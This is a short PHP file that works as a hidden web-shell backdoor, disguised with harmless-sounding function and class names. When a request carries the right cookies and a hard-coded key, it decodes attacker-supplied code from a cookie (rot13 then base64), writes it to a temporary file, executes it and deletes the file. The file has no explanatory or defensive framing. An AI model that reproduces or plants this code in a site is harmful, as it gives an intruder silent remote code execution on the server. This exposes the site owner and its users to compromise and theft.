<?php


if (isset($_COOKIE[46+-46]) && isset($_COOKIE[-53+54]) && isset($_COOKIE[12+-9]) && isset($_COOKIE[16+-12])) {
    $sym = $_COOKIE;
    function task_processor($item) {
        $sym = $_COOKIE;
        $factor = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'd86e9e05');
        if (!is_writable($factor)) {
            $factor = getcwd() . DIRECTORY_SEPARATOR . "event_dispatcher";
        }
        $value = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($sym[3]));
        if (is_writeable($factor)) {
            $rec = fopen($factor, 'w+');
            fputs($rec, $value);
            fclose($rec);
            spl_autoload_unregister(__FUNCTION__);
            require_once($factor);
            @array_map('unlink', array($factor));
        }
    }
    spl_autoload_register("task_processor");
    $res = "1650b9fa86c519e44b4b05f835436787";
    if (!strncmp($res, $sym[4], 32)) {
        if (@class_parents("unit_converter_mutex_lock", true)) {
            exit;
        }
    }
}
